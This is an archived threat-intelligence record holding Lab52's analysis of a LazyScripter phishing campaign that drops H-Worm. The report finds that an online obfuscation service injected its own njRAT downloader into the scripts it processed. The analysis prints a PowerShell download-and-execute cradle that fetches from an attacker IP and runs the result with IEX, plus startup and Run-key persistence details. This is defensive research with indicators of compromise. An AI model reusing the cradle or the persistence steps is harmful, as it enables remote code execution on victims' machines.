{
    "id": "3bba7f8c-6028-48a5-a752-fe6d5978684a",
    "created_at": "2022-10-25T16:48:25.228503Z",
    "updated_at": "2025-03-27T02:15:46.275871Z",
    "deleted_at": null,
    "sha1_hash": "7f124e29c43dfa42c4e4d87b26bd3e18d15d21d4",
    "title": "Very very lazy Lazyscripter's scripts: double compromise in a single obfuscation",
    "authors": "Lab52",
    "file_creation_date": "2022-03-10T18:28:43Z",
    "file_modification_date": "2022-03-10T18:28:43Z",
    "file_size": 1471861,
    "plain_text": "# Very very lazy Lazyscripter’s scripts: double compromise in a single obfuscation\n\n**[lab52.io/blog/very-very-lazy-lazyscripters-scripts-double-compromise-in-a-single-obfuscation](https://lab52.io/blog/very-very-lazy-lazyscripters-scripts-double-compromise-in-a-single-obfuscation/)**\n\n_thespis\n\nIn July of 2021, we identified an infection campaign targeting important European entities.\nDuring this investigation we could identify the threat actor behind these attacks as\n[LazyScripter, an emerging APT group pointed by MalwareBytes in February 2021.](https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf)\n\nThrough our analysis, we could track their activity with precise dates in 2021 based on their\nsamples. Furthermore, we could extend the intelligence upon this threat actor by identifying\na new malware among their TTPs, and also find new elements of the infrastructure.\n\nAdditionally, after the analysis of the samples, we discovered the usage of a free and popular\nonline obfuscating tool for scripts, which would inject their own downloader for a njRAT\nsample within LazyScripter’s malware. Meaning that, if some entity happened to be\ncompromised by a one of these samples of LazyScripter, they would probably be\ncompromised by two different threat actors.\n\nFor this campaign, the malicious actor used phishing emails as the initial vector, pretending\nto be relevant international entities such as the United Nations World Tourism Organization\n(UNWTO or the International Air Transport Association (IATA). In the malicious emails, the\nactor would usually attach three compressed files: a pdf document, and two JavaScript files.\n\n\n-----\n\nPDF document from spear phishing\n\nAfter the analysis of the first pdf document that ended up in our hands (“JOB NOTICE.pdf” –\nUNWTO) we did not observed embedded code, or any malicious behavior. However,\nmetadata revealed that it had been edited with a PDF editor referred to as “Foxit” on July\n13th 2021, less than a month before we identified this campaign.\n\nProducer: Foxit PhantomPDF Printer Version 9.6.0.1818\nCreationDate: Tue Nov 10 08:30:41 2020 CET\nModDate: Tue Jul 13 22:17:50 2021 CEST\n\nThe only technical element of real interest found in this document was the hyperlink in which\nthe user is suggested to click in order to obtain more information about the fake job offer at\nUNWTO.\n\n\n-----\n\nThis link will open a browser and contact the domain securessl.]fit which was registered on\nJuly 17th 2021 and resolves in the address 192.64.]119.125, associated with the provider/webhosting Namecheap.\n\nIt has been observed that the final URL shows up as follows, after a redirection by an HTTP\n302 response from the server, not serving any file at the moment of the analysis, but\nsuggesting it was supposed to serve a .zip file (though, we did not discard IP geofence):\n\nFinal HTTP response via hyperklink from PDF doc\n\nAfter the analysis of the HTTP traffic flow with this domain, the redirection is observed to be\nhidden behind a domain which belongs to the duckdns service for dynamic domains\nresolutions:\n\nMiddle/Transitional HTTP request from PDF\n\nThis domain resolves in the IP address 66.29.]130.204. Even so, the redirection through this\naddress uses TLS encryption, so it is not possible to know what has occurred during the\ncommunication until the final redirection, which ends with the previously shown HTTP 404\nresponse code.\n\nNevertheless, it has been indeed observed how that same IP address is associated to the\n“server1” hostname in the domain gowaymevps.]xyz (registered on May 12th 2021).\n\n\n-----\n\nFinal HTTP request from PDF\n\nTraffic capture for the PDF hyperlink\n\nThe other two files found along with this PDF at its arrival via phishing email have the exact\nsame content (even same hash) in spite of having a different name:\n\nLIST OF AVAILABLE JOBS.js\nSALARY AND HIRING CONDITIONS.js\n\nThis highly obfuscated JavaScript has the only purpose of dropping a second VBS script,\nwhich will be placed in the following paths:\n\nC:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\tk.vbs\nC:\\Users\\*\\AppData\\Roaming\\tk.vbs\n\nFor those samples where the VBS script was not dropped in the startup folder, the following\npersistence mechanism would be established using the registry keys:\n\nHKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\tk\n\nDetails: wscript.exe //B “C:\\Users\\Lucas\\AppData\\Roaming\\tk.vbs”\n\nHKU\\*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tk1\n\nDetails: wscript.exe //B “C:\\Users\\Lucas\\AppData\\Roaming\\tk.vbs”\n\n\n-----\n\nAnd here is where the real fun begins. In the initial behavior analysis of these next stage VBS\nsamples, we observed C2 contact through HTTP POST requests to the port 449 of the IP\naddress 45.91.92.112 resolved from stub.]ignorelist.]com.\n\nAt this point we could find an attribution according to different reports, since the domain\nstub.]ignorelist.]com had been used by the group referred as LazyScripter in their previous\ncampaign.\n\nThe HTTP request is made using the path “/is-ready” in the URI and it includes initial\ninformation about the infected system within the User-Agent header value:\n\nVBS sample HTTP request\n\nFurthermore, we also observed that the vbs script also dropped to disk the following .lnk file:\n\nC:\\Users\\Lucas\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\windowsUpdate.lnk\n\nThis direct access points at the following Powershell execution:\n\n$NQJLOJWQ=(Get-ItemProperty HKCU:\\Software).Sat;\n\n$WASUXIQO=(Get-ItemProperty HKCU:\\Software).Dat;\n\n$NILSHSEJ=(Get-ItemProperty HKCU:\\Software).Gat;\n\n$MYG\n\nThe values of the registry keys which this command refers to contain this series of Powershell\ncommands:\n\n[System.Net.WebClient]$webClient = New-Object System.Net.WebClient;\n\n[System.IO.Stream]$stream = $webClient.OpenRead(‘http://185.\n81.157.186/NDA/199.png’);\n\n[System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList\n$stream;\n\n[string]$results = $sr.ReadToEnd();\n\nIEX $results\n\nRegistry Keys set by VBS sample\n\n\n-----\n\nOur first impression was a little bit of a surprise since we just observed the sample\nestablishing a second persistence in the same startup folder for an artifact (the lnk file) that\nwould use a different C2.\n\nAfter deobfuscating the VBS script we could identify the malware sample as Houdini’s H**Worm, but preceded by an interesting line, still slightly obfuscated. This single line was**\nresponsible for this second kind of parallel behavior (new persistence using the lnk file and a\ndifferent C2).\n\nWhile the first mentioned IP addresses and domains or the infection chain were not easily\nlinked to malicious activity through OSINT, this last one was quickly tagged as malicious\neverywhere.\n\nOSINT results for suspicious IP address\n\nNow it started to get even more interesting as we also discovered that, even though no\ndomain points at this IP address at this time, it used to resolve from the hackfree.]org\ndomain, which belongs to top 1 million, and seems to be some web service for offensive\noperations/techniques:\n\n\n-----\n\nDNS resolutions on suspicious IP address\n\nGoogle results for hackfree.]org\n\nSince this finding could be a little confusing as it was for us, let’s go back to the dropped VBS\nscript. This script will be the one which implements the RAT identified as H-worm after a\ncomplex nested obfuscation, prepended with a confusing extra line.\n\n\n-----\n\nPart of such obfuscation implied the creation of a new script object which will execute the\ndeobfuscate code. For this purpose, the first part of the logic consists in identifying the\narchitecture of the infected system, and then creating nested ScriptControl objects, where the\ncode which implements the totality of H-worm will be added. Such code is read from an array\nwhich must be necessarily located in the last line of the file, commented, and which contains\na total of 16.153 obfuscated elements.\n\nContent of VBS sample (tk.vbs)\n\n\n-----\n\ntk.vbs deobfuscated\n\nNow, we could know that this VBS script acted as some sort of loader for the final stage\nartifact, which was fully implemented in the aforementioned last line, supposed to be a\ncommented line in VBS. In order to compare the different samples that we gathered, we\nimplemented an automatic deobfuscator to straightly obtain the deobfuscated code\nimplemented in the commented line and we always found this first line prepended before the\nH-worm code.\n\nFinal VBS payload (H-Worm)\n\n\n-----\n\nBefore analyzing this extra suspicious code, which we could corroborate it was not part of the\nknown source code for H-Worm, the obvious thought was that these lines were added by the\nLazyScripter criminals and that they were placing dates in the script for their own reasons.\nHowever, it still seemed weird that they would reward the threat/forensic analysts with a\nprecise date for each sample.\n\nAfter the analysis of the snippets, we observed that the samples would compare the current\ndate with the hardcoded date, and if the hardcoded day arrived or passed, it would execute a\nspecific function appended at the end of H-Worm’s code. This function would only drop the\npreviously described .lnk file and set the mentioned registry key values so as to download a\nsample of njRAT. Even though the author of H-Worm, known as “Houdini” had been\nconnected to the development of njRAT, we knew this wasn’t part of the known\nimplementation for H-Worm, and still looked odd as a TTP from the same infection\ncampaign.\n\nTrying to make sense out of it, we had the brainwave of using the information we had about\nthis parallel behavior and make a quick check: We previously found out that they might\nhave been using hackfree.]org as an online obfuscation service for VBS script, so we created\nour own dummy VBS script and submitted it to hackfree for obfuscation. Then we applied\nour implemented deobfuscator.\n\nImplemented dummy VBS script\n\n\n-----\n\nDummy VBS script obfuscated via hackfree website\n\nDeobfuscation of obfuscated dummy VBS script\n\n\n-----\n\nAt this point, we discovered that hackfree].org was injecting their own malware in every\nobfuscated script via their website, and this would lead in a double infection for malware\nobfuscated with hackfree.]org, or a first “sneaky” infection for those scripts that were\nobfuscated for legitimate purposes. At this last scenario we could confirm that hackfree.]org\nwould be a waterhole attack.\n\nFinally, back to the tracked threat actor, we could distinguish between LazyScripter’s\nindicators of compromise, and HackFree’s IOCs, resulting in the following diagram for this\nLazyScripter campaign main infrastructure and infection chain.\n\nLazyScripter’s H-Worm campaign’s main infrastructure\n\nIOCs\n\n\n-----\n\n0fc8d0c3b6ab22533153b7296e597312fc8cf02e2ea92de226d93c09eaf8e579 SHA256\n\n77afef33c249d4d7bb076079eff1cca2aef272c84720e7f258435728be3bf049 SHA256\n\n82f6c8b52103272fcfb27ac71bd4bff76ee970dd16e5cdf3d0cfb75d10aa0609 SHA256\n\n5803ded992498b5bd5045095ca1eab33be8a4f9d785fdfc8b231127edf049e72 SHA256\n\nf5359df2aaa02fbfae540934f3e8f8a2ab362f7ee92dda536846afb67cea1b02 SHA256\n\nc685897eb3f32ced2b6e404e424ca01d0bc8c88b83da067fbef7e7fe889cffad SHA256\n\n23ea10f4b1a73a4e8b13466fff8983110216779d2d3cefe1fc151c6bb65c3b42 SHA256\n\n45.91.92.112:449 C2\n\n185.81.157.186 C2\n\n192.64.119.125 C2\n\n157.245.250.76 C2\n\n66.29.130.204 C2\n\n147.182.192.241 C2\n\n103.73.64.115 C2\n\nhttp://185.81.]157.186/NDA/199.png URI\n\nhttp://157.245.]250.76/MORE%20INFORMATION%20ON%20OFFERS.zip URI\n\nstub.]ignorelist.com C2 Domain\n\nsecuressl.]fit C2 Domain\n\ngowaymevps.]xyz C2 Domain\n\nmilla.publicvm.]com C2 Domain\n\ninternetexploraldon.]sytes.net C2 Domain\n\njbizgsvhzj22evqon9ezz8bmbupp1s6cprmriam1.duckdns.]org C2 Domain\n\nsaqicpcgflrlgxgoxxzkbfrjuisbkozeqrmthrzo.duckdns.]org C2 Domain\n\nu1153246fov.ha004.t.justns.]ru C2 Domain\n\nHKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\tk Reg Key\n\nHKU*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tk Reg Key\n\n\n-----\n\nC:\\Users\\Lucas\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\windowsUpdate.lnk\n\n\nFile\npersistence\n\n\nCustomers with Lab52’s APT intelligence private feed service already have more tools and\nmeans of detection for this campaign.\nIn case of having threat hunting service or being client of S2Grupo CERT, this intelligence\nhas already been applied.\n\nIf you need more information about Lab52’s private APT intelligence feed service, you can\n[contact us through the following link](https://lab52.io/contact)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/3rr58tcaqth9rn1ege689pq4f94zjsgx"
    ],
    "report_names": [
        "Lab52_Lazyscripters-double-compromise-single-obfuscation(03-09-2022)"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b20281dd-8cc4-4284-b85c-f98c7e09ae48",
            "created_at": "2022-10-25T15:50:23.642844Z",
            "updated_at": "2025-03-27T02:00:55.512068Z",
            "deleted_at": null,
            "main_name": "LazyScripter",
            "aliases": [
                "LazyScripter"
            ],
            "source_name": "MITRE:LazyScripter",
            "tools": [
                "Remcos",
                "QuasarRAT",
                "njRAT",
                "ngrok",
                "Koadic",
                "KOCTOPUS",
                "Ngrok"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "712fc9fa-4283-431b-882c-5e0de9c12452",
            "created_at": "2022-10-25T16:07:23.770209Z",
            "updated_at": "2025-03-27T02:02:09.973149Z",
            "deleted_at": null,
            "main_name": "LazyScripter",
            "aliases": [],
            "source_name": "ETDA:LazyScripter",
            "tools": [
                "Adwind",
                "Adwind RAT",
                "Alien Spy",
                "AlienSpy",
                "Bladabindi",
                "CinaRAT",
                "EmPyre",
                "EmpireProject",
                "Empoder",
                "Frutas",
                "Gussdoor",
                "Invoke-Ngrok",
                "JBifrost RAT",
                "JSocket",
                "Jorik",
                "KOCTOPUS",
                "Koadic",
                "Luminosity RAT",
                "LuminosityLink",
                "Nishang",
                "PowerShell Empire",
                "Quasar RAT",
                "QuasarRAT",
                "Remcos",
                "RemcosRAT",
                "Remote Manipulator System",
                "Remvio",
                "RuRAT",
                "Sockrat",
                "Socmer",
                "Trojan.Maljava",
                "UnReCoM",
                "Unknown RAT",
                "Unrecom",
                "Yggdrasil",
                "jBiFrost",
                "jConnectPro RAT",
                "jFrutas",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716505,
    "ts_updated_at": 1743041746,
    "ts_creation_date": 1646936923,
    "ts_modification_date": 1646936923,
    "files": {
        "pdf": "https://archive.orkl.eu/7f124e29c43dfa42c4e4d87b26bd3e18d15d21d4.pdf",
        "text": "https://archive.orkl.eu/7f124e29c43dfa42c4e4d87b26bd3e18d15d21d4.txt",
        "img": "https://archive.orkl.eu/7f124e29c43dfa42c4e4d87b26bd3e18d15d21d4.jpg"
    }
}